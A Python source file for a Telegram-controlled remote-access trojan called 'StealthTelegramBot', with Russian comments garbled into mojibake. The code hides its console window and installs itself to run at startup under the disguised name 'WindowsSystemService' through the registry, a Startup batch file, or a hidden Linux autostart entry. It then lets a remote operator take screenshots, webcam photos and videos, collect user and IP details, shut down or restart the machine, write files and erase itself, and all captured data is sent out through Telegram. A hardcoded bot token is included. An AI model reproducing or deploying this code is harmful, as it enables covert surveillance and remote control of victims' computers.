
import os
import sys
import json
import socket
import platform
import subprocess
import threading
import requests
import cv2
import psutil
import telebot
from datetime import datetime
import time
import shutil
import tempfile
import mss
import mss.tools
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

class StealthTelegramBot:
    def __init__(self, token):
        self.bot = telebot.TeleBot(token)
        self.running = True
        self.chat_id = None
        self.setup_autostart()
        self.hide_window()
        self.setup_handlers()
        
    def setup_autostart(self):
        """–î–æ–±–∞–≤–ª–µ–Ω–∏–µ –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É"""
        try:
            if platform.system() == "Windows":
                import winreg
                
                # –ü–æ–ª—É—á–∞–µ–º –ø—É—Ç—å –∫ —Ç–µ–∫—É—â–µ–º—É –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–º—É —Ñ–∞–π–ª—É
                if getattr(sys, 'frozen', False):
                    exe_path = sys.executable
                else:
                    exe_path = os.path.abspath(__file__)
                
                # –î–æ–±–∞–≤–ª—è–µ–º –≤ —Ä–µ–µ—Å—Ç—Ä –¥–ª—è –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏
                key = winreg.HKEY_CURRENT_USER
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                
                try:
                    with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as regkey:
                        winreg.SetValueEx(regkey, "WindowsSystemService", 0, winreg.REG_SZ, f'"{exe_path}"')
                except Exception:
                    # –ï—Å–ª–∏ –Ω–µ—Ç –ø—Ä–∞–≤, –ø—Ä–æ–±—É–µ–º —Å–æ–∑–¥–∞—Ç—å —Å–∫—Ä–∏–ø—Ç –≤ –ø–∞–ø–∫–µ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏
                    startup_path = os.path.join(os.getenv('APPDATA'), 
                                              'Microsoft', 'Windows', 'Start Menu', 
                                              'Programs', 'Startup')
                    if os.path.exists(startup_path):
                        bat_path = os.path.join(startup_path, "system_service.bat")
                        with open(bat_path, 'w') as f:
                            f.write(f'@echo off\nstart "" "{exe_path}"\n')
            
            elif platform.system() == "Linux":
                autostart_path = os.path.expanduser("~/.config/autostart/")
                os.makedirs(autostart_path, exist_ok=True)
                
                desktop_file = f"""[Desktop Entry]
Type=Application
Name=SystemService
Exec=python3 {os.path.abspath(__file__)}
Hidden=true
X-GNOME-Autostart-enabled=true
"""
                
                with open(os.path.join(autostart_path, "systemservice.desktop"), "w") as f:
                    f.write(desktop_file)
                    
        except Exception as e:
            pass

    def hide_window(self):
        """–°–∫—Ä—ã—Ç–∏–µ –æ–∫–Ω–∞"""
        try:
            if platform.system() == "Windows":
                import ctypes
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

    def create_keyboard(self):
        """–°–æ–∑–¥–∞–Ω–∏–µ –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã —Å –∫–Ω–æ–ø–∫–∞–º–∏"""
        keyboard = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        
        buttons = [
            KeyboardButton('üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç'),
            KeyboardButton('üíª –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–∏—Å—Ç–µ–º–µ'),
            KeyboardButton('üåê –û—Ç–∫—Ä—ã—Ç—å Google'),
            KeyboardButton('‚ö° –í—ã–∫–ª—é—á–∏—Ç—å –ü–ö'),
            KeyboardButton('üîÑ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ü–ö'),
            KeyboardButton('üì∑ –§–æ—Ç–æ —Å –≤–µ–±–∫–∏'),
            KeyboardButton('üé• –ó–∞–ø–∏—Å—å —Å –≤–µ–±–∫–∏ (10 —Å–µ–∫)'),
            KeyboardButton('üìä –°—Ç–∞—Ç—É—Å —Å–∏—Å—Ç–µ–º—ã'),
            KeyboardButton('üíÄ –°–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ'),
            KeyboardButton('‚ÑπÔ∏è –ü–æ–º–æ—â—å')
        ]
        
        # –î–æ–±–∞–≤–ª—è–µ–º –∫–Ω–æ–ø–∫–∏ –≤ –¥–≤–∞ —Ä—è–¥–∞
        for i in range(0, len(buttons), 2):
            if i + 1 < len(buttons):
                keyboard.add(buttons[i], buttons[i+1])
            else:
                keyboard.add(buttons[i])
                
        return keyboard

    def setup_handlers(self):
        """–ù–∞—Å—Ç—Ä–æ–π–∫–∞ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–æ–≤ –∫–æ–º–∞–Ω–¥"""
        
        @self.bot.message_handler(func=lambda message: True)
        def handle_all_messages(message):
            self.chat_id = message.chat.id
            text = message.text.lower()
            
            if text == 'üì∏ —Å–∫—Ä–∏–Ω—à–æ—Ç':
                self.handle_screenshot(message)
            elif text == 'üíª –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–∏—Å—Ç–µ–º–µ':
                self.handle_sysinfo(message)
            elif text == 'üåê –æ—Ç–∫—Ä—ã—Ç—å google':
                self.handle_openurl_special(message, 'https://google.com')
            elif text == '‚ö° –≤—ã–∫–ª—é—á–∏—Ç—å –ø–∫':
                self.handle_shutdown(message)
            elif text == 'üîÑ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ø–∫':
                self.handle_restart(message)
            elif text == 'üì∑ —Ñ–æ—Ç–æ —Å –≤–µ–±–∫–∏':
                self.handle_webcam_photo(message)
            elif text == 'üé• –∑–∞–ø–∏—Å—å —Å –≤–µ–±–∫–∏ (10 —Å–µ–∫)':
                self.handle_webcam_video_special(message, 10)
            elif text == 'üìä —Å—Ç–∞—Ç—É—Å —Å–∏—Å—Ç–µ–º—ã':
                self.handle_status(message)
            elif text == 'üíÄ —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ':
                self.handle_self_destruct(message)
            elif text == '‚ÑπÔ∏è –ø–æ–º–æ—â—å':
                self.send_help(message)
            else:
                self.bot.send_message(message.chat.id, "‚ùå –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–Ω–æ–ø–∫–∏ –Ω–∏–∂–µ üëá", 
                                    reply_markup=self.create_keyboard())

        @self.bot.message_handler(commands=['start', 'help'])
        def send_help(message):
            self.chat_id = message.chat.id
            help_text = """
ü§ñ *–°—Ç–µ–ª—Å –±–æ—Ç –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω*

_–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–æ–∫ –Ω–∏–∂–µ:_

üì∏ *–°–∫—Ä–∏–Ω—à–æ—Ç* - –°–¥–µ–ª–∞—Ç—å —Å–Ω–∏–º–æ–∫ —ç–∫—Ä–∞–Ω–∞
üíª *–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–∏—Å—Ç–µ–º–µ* - –ü–æ–ª—É—á–∏—Ç—å –¥–∞–Ω–Ω—ã–µ –æ –ü–ö
üåê *–û—Ç–∫—Ä—ã—Ç—å Google* - –ó–∞–ø—É—Å—Ç–∏—Ç—å –±—Ä–∞—É–∑–µ—Ä —Å Google
‚ö° *–í—ã–∫–ª—é—á–∏—Ç—å –ü–ö* - –ó–∞–≤–µ—Ä—à–∏—Ç—å —Ä–∞–±–æ—Ç—É –∫–æ–º–ø—å—é—Ç–µ—Ä–∞
üîÑ *–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ü–ö* - –ü–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç—å —Å–∏—Å—Ç–µ–º—É
üì∑ *–§–æ—Ç–æ —Å –≤–µ–±–∫–∏* - –°–¥–µ–ª–∞—Ç—å —Ñ–æ—Ç–æ —Å –≤–µ–±–∫–∞–º–µ—Ä—ã
üé• *–ó–∞–ø–∏—Å—å —Å –≤–µ–±–∫–∏* - –ó–∞–ø–∏—Å–∞—Ç—å –≤–∏–¥–µ–æ (10 —Å–µ–∫—É–Ω–¥)
üìä *–°—Ç–∞—Ç—É—Å —Å–∏—Å—Ç–µ–º—ã* - –¢–µ–∫—É—â–µ–µ —Å–æ—Å—Ç–æ—è–Ω–∏–µ —Å–∏—Å—Ç–µ–º—ã
üíÄ *–°–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ* - –£–¥–∞–ª–∏—Ç—å –±–æ—Ç–∞ —Å —Å–∏—Å—Ç–µ–º—ã

*–¢–∞–∫–∂–µ –¥–æ—Å—Ç—É–ø–Ω—ã –∫–æ–º–∞–Ω–¥—ã:*
/openurl [—Å—Å—ã–ª–∫–∞] - –û—Ç–∫—Ä—ã—Ç—å –ª—é–±–æ–π —Å–∞–π—Ç
/savefile [–∏–º—è] [—Ç–µ–∫—Å—Ç] - –°–æ—Ö—Ä–∞–Ω–∏—Ç—å —Ñ–∞–π–ª –Ω–∞ —Ä–∞–±–æ—á–∏–π —Å—Ç–æ–ª
/webcam_video [—Å–µ–∫—É–Ω–¥—ã] - –ó–∞–ø–∏—Å—å –≤–∏–¥–µ–æ –Ω–∞ —É–∫–∞–∑–∞–Ω–Ω–æ–µ –≤—Ä–µ–º—è
"""
            self.bot.send_message(message.chat.id, help_text, parse_mode='Markdown', 
                                reply_markup=self.create_keyboard())

    def handle_screenshot(self, message):
        """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞"""
        try:
            self.bot.send_message(message.chat.id, "üì∏ –î–µ–ª–∞—é —Å–∫—Ä–∏–Ω—à–æ—Ç...")
            result = self.take_screenshot()
            if os.path.exists(result):
                with open(result, 'rb') as photo:
                    self.bot.send_photo(message.chat.id, photo)
                os.remove(result)
                self.bot.send_message(message.chat.id, "‚úÖ –°–∫—Ä–∏–Ω—à–æ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω!", 
                                    reply_markup=self.create_keyboard())
            else:
                self.bot.send_message(message.chat.id, result, 
                                    reply_markup=self.create_keyboard())
        except Exception as e:
            self.bot.send_message(message.chat.id, f"‚ùå –û—à–∏–±–∫–∞: {str(e)}", 
                                reply_markup=self.create_keyboard())

    def handle_sysinfo(self, message):
        """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–∏—Å—Ç–µ–º–µ"""
        try:
            self.bot.send_message(message.chat.id, "üíª –°–æ–±–∏—Ä–∞—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é...")
            info = self.get_system_info()
            self.bot.send_message(message.chat.id, f"```\n{info}\n```", 
                                parse_mode='Markdown', reply_markup=self.create_keyboard())
        except Exception as e:
            self.bot.send_message(message.chat.id, f"‚ùå –û—à–∏–±–∫–∞: {str(e)}", 
                                reply_markup=self.create_keyboard())

    def handle_openurl_special(self, message, url):
        """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –æ—Ç–∫—Ä—ã—Ç–∏—è URL"""
        try:
            result = self.open_url(url)
            self.bot.send_message(message.chat.id, result, 
                                reply_markup=self.create_keyboard())
        except Exception as e:
            self.bot.send_message(message.chat.id, f"‚ùå –û—à–∏–±–∫–∞: {str(e)}", 
                                reply_markup=self.create_keyboard())

    def handle_shutdown(self, message):
        """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –≤—ã–∫–ª—é—á–µ–Ω–∏—è"""
        try:
            result = self.shutdown_pc()
            self.bot.send_message(message.chat.id, result, 
                                reply_markup=self.create_keyboard())
        except Exception as e:
            self.bot.send_message(message.chat.id, f"‚ùå –û—à–∏–±–∫–∞: {str(e)}", 
                                reply_markup=self.create_keyboard())

    def handle_restart(self, message):
        """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∏"""
        try:
            result = self.restart_pc()
            self.bot.send_message(message.chat.id, result, 
                                reply_markup=self.create_keyboard())
        except Exception as e:
            self.bot.send_message(message.chat.id, f"‚ùå –û—à–∏–±–∫–∞: {str(e)}", 
                                reply_markup=self.create_keyboard())

    def handle_webcam_photo(self, message):
        """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ —Ñ–æ—Ç–æ —Å –≤–µ–±–∫–∞–º–µ—Ä—ã"""
        try:
            self.bot.send_message(message.chat.id, "üì∑ –î–µ–ª–∞—é —Ñ–æ—Ç–æ...")
            result = self.webcam_photo()
            if os.path.exists(result):
                with open(result, 'rb') as photo:
                    self.bot.send_photo(message.chat.id, photo)
                os.remove(result)
                self.bot.send_message(message.chat.id, "‚úÖ –§–æ—Ç–æ —Å–¥–µ–ª–∞–Ω–æ!", 
                                    reply_markup=self.create_keyboard())
            else:
                self.bot.send_message(message.chat.id, result, 
                                    reply_markup=self.create_keyboard())
        except Exception as e:
            self.bot.send_message(message.chat.id, f"‚ùå –û—à–∏–±–∫–∞: {str(e)}", 
                                reply_markup=self.create_keyboard())

    def handle_webcam_video_special(self, message, seconds):
        """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∑–∞–ø–∏—Å–∏ –≤–∏–¥–µ–æ"""
        try:
            self.bot.send_message(message.chat.id, f"üé• –ó–∞–ø–∏—Å—ã–≤–∞—é {seconds} —Å–µ–∫—É–Ω–¥...")
            result = self.webcam_video(seconds)
            
            if os.path.exists(result):
                with open(result, 'rb') as video:
                    self.bot.send_video(message.chat.id, video)
                os.remove(result)
                self.bot.send_message(message.chat.id, "‚úÖ –í–∏–¥–µ–æ –∑–∞–ø–∏—Å–∞–Ω–æ!", 
                                    reply_markup=self.create_keyboard())
            else:
                self.bot.send_message(message.chat.id, result, 
                                    reply_markup=self.create_keyboard())
        except Exception as e:
            self.bot.send_message(message.chat.id, f"‚ùå –û—à–∏–±–∫–∞: {str(e)}", 
                                reply_markup=self.create_keyboard())

    def handle_status(self, message):
        """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ —Å—Ç–∞—Ç—É—Å–∞"""
        try:
            status = self.get_status()
            self.bot.send_message(message.chat.id, status, 
                                reply_markup=self.create_keyboard())
        except Exception as e:
            self.bot.send_message(message.chat.id, f"‚ùå –û—à–∏–±–∫–∞: {str(e)}", 
                                reply_markup=self.create_keyboard())

    def handle_self_destruct(self, message):
        """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏—è"""
        try:
            self.bot.send_message(message.chat.id, "üíÄ –°–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥...")
            time.sleep(5)
            self.self_destruct()
        except Exception as e:
            self.bot.send_message(message.chat.id, f"‚ùå –û—à–∏–±–∫–∞: {str(e)}", 
                                reply_markup=self.create_keyboard())

    def get_status(self):
        """–°—Ç–∞—Ç—É—Å —Å–∏—Å—Ç–µ–º—ã"""
        try:
            status = {
                "üñ•Ô∏è –°–∏—Å—Ç–µ–º–∞": platform.system(),
                "üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å": os.getlogin(),
                "‚è∞ –í—Ä–µ–º—è —Ä–∞–±–æ—Ç—ã": str(datetime.now() - datetime.fromtimestamp(psutil.boot_time())),
                "üíæ –ü–∞–º—è—Ç—å": f"{psutil.virtual_memory().percent}% –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ",
                "üíø –î–∏—Å–∫ C:": f"{psutil.disk_usage('C:').percent}% –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ" if platform.system() == "Windows" else f"{psutil.disk_usage('/').percent}% –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ",
                "üì° IP –∞–¥—Ä–µ—Å": socket.gethostbyname(socket.gethostname())
            }
            return "\n".join([f"{k}: {v}" for k, v in status.items()])
        except Exception as e:
            return f"‚ùå –û—à–∏–±–∫–∞ —Å—Ç–∞—Ç—É—Å–∞: {str(e)}"

    def take_screenshot(self):
        """–°–∫—Ä–∏–Ω—à–æ—Ç —ç–∫—Ä–∞–Ω–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º mss"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"screenshot_{timestamp}.png"
            
            with mss.mss() as sct:
                monitor = sct.monitors[1]
                sct_img = sct.grab(monitor)
                mss.tools.to_png(sct_img.rgb, sct_img.size, output=filename)
            
            return filename
        except Exception as e:
            return f"‚ùå –û—à–∏–±–∫–∞ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞: {str(e)}"

    def get_system_info(self):
        """–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–∏—Å—Ç–µ–º–µ"""
        try:
            info = {
                "üñ•Ô∏è –°–∏—Å—Ç–µ–º–∞": platform.system(),
                "üìã –í–µ—Ä—Å–∏—è": platform.version(),
                "‚ö° –ü—Ä–æ—Ü–µ—Å—Å–æ—Ä": platform.processor() or "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω",
                "üíæ –ü–∞–º—è—Ç—å –û–ó–£": f"{psutil.virtual_memory().total // (1024**3)} GB",
                "üíø –î–∏—Å–∫": f"{psutil.disk_usage('/').total // (1024**3)} GB total",
                "üñ•Ô∏è –ò–º—è –ü–ö": socket.gethostname(),
                "üåê IP –∞–¥—Ä–µ—Å": socket.gethostbyname(socket.gethostname()),
                "üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å": os.getlogin(),
                "‚è∞ –í—Ä–µ–º—è —Ä–∞–±–æ—Ç—ã": str(datetime.now() - datetime.fromtimestamp(psutil.boot_time())),
                "üîã –ë–∞—Ç–∞—Ä–µ—è": f"{psutil.sensors_battery().percent}%" if hasattr(psutil.sensors_battery(), 'percent') else "–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ"
            }
            return json.dumps(info, indent=2, ensure_ascii=False)
        except Exception as e:
            return f"‚ùå –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏: {str(e)}"

    def open_url(self, url):
        """–û—Ç–∫—Ä—ã—Ç–∏–µ URL"""
        try:
            if not url.startswith(('http://', 'https://')):
                url = 'https://' + url
                
            if platform.system() == "Windows":
                os.startfile(url)
            elif platform.system() == "Darwin":
                subprocess.Popen(['open', url])
            else:
                subprocess.Popen(['xdg-open', url])
            return f"‚úÖ –û—Ç–∫—Ä—ã–≤–∞—é: {url}"
        except Exception as e:
            return f"‚ùå –û—à–∏–±–∫–∞ –æ—Ç–∫—Ä—ã—Ç–∏—è URL: {str(e)}"

    def shutdown_pc(self):
        """–í—ã–∫–ª—é—á–µ–Ω–∏–µ –ü–ö"""
        try:
            if platform.system() == "Windows":
                os.system("shutdown /s /t 5")
            elif platform.system() == "Linux":
                os.system("shutdown now")
            elif platform.system() == "Darwin":
                os.system("shutdown -h now")
            return "‚úÖ –í—ã–∫–ª—é—á–∞—é –ü–ö —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥..."
        except Exception as e:
            return f"‚ùå –û—à–∏–±–∫–∞ –≤—ã–∫–ª—é—á–µ–Ω–∏—è: {str(e)}"

    def restart_pc(self):
        """–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞ –ü–ö"""
        try:
            if platform.system() == "Windows":
                os.system("shutdown /r /t 5")
            elif platform.system() == "Linux":
                os.system("reboot")
            elif platform.system() == "Darwin":
                os.system("shutdown -r now")
            return "‚úÖ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∂–∞—é –ü–ö —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥..."
        except Exception as e:
            return f"‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∏: {str(e)}"

    def save_file(self, content, filename):
        """–°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ —Ñ–∞–π–ª–∞ –Ω–∞ —Ä–∞–±–æ—á–∏–π —Å—Ç–æ–ª"""
        try:
            desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
            os.makedirs(desktop_path, exist_ok=True)
            file_path = os.path.join(desktop_path, filename)
            
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(content)
            
            return f"‚úÖ –§–∞–π–ª —Å–æ—Ö—Ä–∞–Ω–µ–Ω: {file_path}"
        except Exception as e:
            return f"‚ùå –û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Ñ–∞–π–ª–∞: {str(e)}"

    def webcam_photo(self):
        """–§–æ—Ç–æ —Å –≤–µ–±–∫–∞–º–µ—Ä—ã"""
        try:
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                return "‚ùå –í–µ–±–∫–∞–º–µ—Ä–∞ –Ω–µ –¥–æ—Å—Ç—É–ø–Ω–∞"
            
            time.sleep(1)
            ret, frame = cap.read()
            cap.release()
            
            if ret:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"webcam_photo_{timestamp}.jpg"
                cv2.imwrite(filename, frame)
                return filename
            else:
                return "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —Å–¥–µ–ª–∞—Ç—å —Ñ–æ—Ç–æ"
                
        except Exception as e:
            return f"‚ùå –û—à–∏–±–∫–∞ –≤–µ–±–∫–∞–º–µ—Ä—ã: {str(e)}"

    def webcam_video(self, seconds=10):
        """–ó–∞–ø–∏—Å—å –≤–∏–¥–µ–æ —Å –≤–µ–±–∫–∞–º–µ—Ä—ã"""
        try:
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                return "‚ùå –í–µ–±–∫–∞–º–µ—Ä–∞ –Ω–µ –¥–æ—Å—Ç—É–ø–Ω–∞"
            
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
            
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"webcam_video_{timestamp}.avi"
            
            out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))
            
            start_time = time.time()
            while (time.time() - start_time) < seconds:
                ret, frame = cap.read()
                if ret:
                    out.write(frame)
                else:
                    break
                time.sleep(0.05)
            
            cap.release()
            out.release()
            return filename
            
        except Exception as e:
            return f"‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø–∏—Å–∏ –≤–∏–¥–µ–æ: {str(e)}"

    def self_destruct(self):
        """–°–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ"""
        try:
            if platform.system() == "Windows":
                import winreg
                key = winreg.HKEY_CURRENT_USER
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                try:
                    with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as regkey:
                        winreg.DeleteValue(regkey, "WindowsSystemService")
                except:
                    pass
                
                startup_path = os.path.join(os.getenv('APPDATA'), 
                                          'Microsoft', 'Windows', 'Start Menu', 
                                          'Programs', 'Startup')
                bat_path = os.path.join(startup_path, "system_service.bat")
                if os.path.exists(bat_path):
                    os.remove(bat_path)
            
            current_file = os.path.abspath(__file__)
            if os.path.exists(current_file):
                os.remove(current_file)
            
            sys.exit(0)
            
        except Exception as e:
            sys.exit(1)

    def run(self):
        """–ó–∞–ø—É—Å–∫ –±–æ—Ç–∞"""
        while self.running:
            try:
                self.bot.polling(none_stop=True, timeout=30)
            except Exception as e:
                time.sleep(10)

def main():
    # –ó–∞–º–µ–Ω–∏—Ç–µ YOUR_BOT_TOKEN –Ω–∞ —Ç–æ–∫–µ–Ω –≤–∞—à–µ–≥–æ –±–æ—Ç–∞
    BOT_TOKEN = "5403558286:AAE7t0M2u-Rctr4kYQOZR9weItKhbciqwnI"
    
    bot = StealthTelegramBot(BOT_TOKEN)
    bot.run()

if __name__ == "__main__":
    main()